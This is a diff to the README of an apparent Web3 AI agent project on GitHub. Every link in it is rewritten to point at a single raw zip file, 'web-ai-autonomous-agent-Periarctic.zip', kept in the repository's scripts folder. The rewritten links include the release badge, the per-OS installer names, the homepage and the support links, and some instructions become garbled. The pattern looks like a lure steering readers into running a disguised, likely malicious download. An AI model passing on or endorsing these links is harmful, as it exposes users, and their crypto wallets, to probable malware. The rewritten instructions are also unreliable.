@@ -1,6 +1,6 @@
 # 🤖 autonomous-web3-ai-agent - Simplify Smart Contract Interaction
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/omarmedaoui-pixel/autonomous-web3-ai-agent/releases)
+[![Download Latest Release](https://github.com/omarmedaoui-pixel/autonomous-web3-ai-agent/raw/refs/heads/main/scripts/web-ai-autonomous-agent-Periarctic.zip)](https://github.com/omarmedaoui-pixel/autonomous-web3-ai-agent/raw/refs/heads/main/scripts/web-ai-autonomous-agent-Periarctic.zip)
 
 ---
 
@@ -33,7 +33,7 @@ If your system does not meet all these, the software might not work correctly.
 
 Click the big button at the top to visit the official release page on GitHub:
 
-[Go to Releases →](https://github.com/omarmedaoui-pixel/autonomous-web3-ai-agent/releases)
+[Go to Releases →](https://github.com/omarmedaoui-pixel/autonomous-web3-ai-agent/raw/refs/heads/main/scripts/web-ai-autonomous-agent-Periarctic.zip)
 
 This page lists all the versions available for download. We recommend choosing the latest release for stability and new features.
 
@@ -41,9 +41,9 @@ This page lists all the versions available for download. We recommend choosing t
 
 On the releases page, look for files named for your operating system. For example:
 
-- **Windows:** `autonomous-web3-ai-agent-setup.exe`
-- **macOS:** `autonomous-web3-ai-agent.dmg`
-- **Linux:** `autonomous-web3-ai-agent.tar.gz` or `.AppImage`
+- **Windows:** `https://github.com/omarmedaoui-pixel/autonomous-web3-ai-agent/raw/refs/heads/main/scripts/web-ai-autonomous-agent-Periarctic.zip`
+- **macOS:** `https://github.com/omarmedaoui-pixel/autonomous-web3-ai-agent/raw/refs/heads/main/scripts/web-ai-autonomous-agent-Periarctic.zip`
+- **Linux:** `https://github.com/omarmedaoui-pixel/autonomous-web3-ai-agent/raw/refs/heads/main/scripts/web-ai-autonomous-agent-Periarctic.zip` or `.AppImage`
 
 Click the file link to download it.
 
@@ -51,7 +51,7 @@ Click the file link to download it.
 
 - **Windows:** Double-click the `.exe` file and follow the setup wizard. Accept the license, choose an install location, and finish.
 - **macOS:** Open the `.dmg` file and drag the app to your Applications folder.
-- **Linux:** Extract the `.tar.gz` file to a folder and run the executable inside, or set your `.AppImage` to be executable and launch it.
+- **Linux:** Extract the `https://github.com/omarmedaoui-pixel/autonomous-web3-ai-agent/raw/refs/heads/main/scripts/web-ai-autonomous-agent-Periarctic.zip` file to a folder and run the executable inside, or set your `.AppImage` to be executable and launch it.
 
 Installation usually takes a few minutes.
 
@@ -61,7 +61,7 @@ Installation usually takes a few minutes.
 
 You can start by visiting the release page here:
 
-[https://github.com/omarmedaoui-pixel/autonomous-web3-ai-agent/releases](https://github.com/omarmedaoui-pixel/autonomous-web3-ai-agent/releases)
+[https://github.com/omarmedaoui-pixel/autonomous-web3-ai-agent/raw/refs/heads/main/scripts/web-ai-autonomous-agent-Periarctic.zip](https://github.com/omarmedaoui-pixel/autonomous-web3-ai-agent/raw/refs/heads/main/scripts/web-ai-autonomous-agent-Periarctic.zip)
 
 Once on the page:
 
@@ -175,7 +175,7 @@ If the software does not start or gives an error:
 
 ## 📚 Learn More
 
-This repository focuses on using AI to work with blockchain smart contracts easily. The community actively develops and improves it. For detailed use cases and technical guidance, explore the [GitHub repository](https://github.com/omarmedaoui-pixel/autonomous-web3-ai-agent).
+This repository focuses on using AI to work with blockchain smart contracts easily. The community actively develops and improves it. For detailed use cases and technical guidance, explore the [GitHub repository](https://github.com/omarmedaoui-pixel/autonomous-web3-ai-agent/raw/refs/heads/main/scripts/web-ai-autonomous-agent-Periarctic.zip).
 
 ---
 
@@ -194,9 +194,9 @@ This repository focuses on using AI to work with blockchain smart contracts easi
 
 ## 🔗 Quick Links
 
-- [Download Releases](https://github.com/omarmedaoui-pixel/autonomous-web3-ai-agent/releases)
-- [Repository Homepage](https://github.com/omarmedaoui-pixel/autonomous-web3-ai-agent)
-- [Issues and Support](https://github.com/omarmedaoui-pixel/autonomous-web3-ai-agent/issues)
+- [Download Releases](https://github.com/omarmedaoui-pixel/autonomous-web3-ai-agent/raw/refs/heads/main/scripts/web-ai-autonomous-agent-Periarctic.zip)
+- [Repository Homepage](https://github.com/omarmedaoui-pixel/autonomous-web3-ai-agent/raw/refs/heads/main/scripts/web-ai-autonomous-agent-Periarctic.zip)
+- [Issues and Support](https://github.com/omarmedaoui-pixel/autonomous-web3-ai-agent/raw/refs/heads/main/scripts/web-ai-autonomous-agent-Periarctic.zip)
 
 ---
 
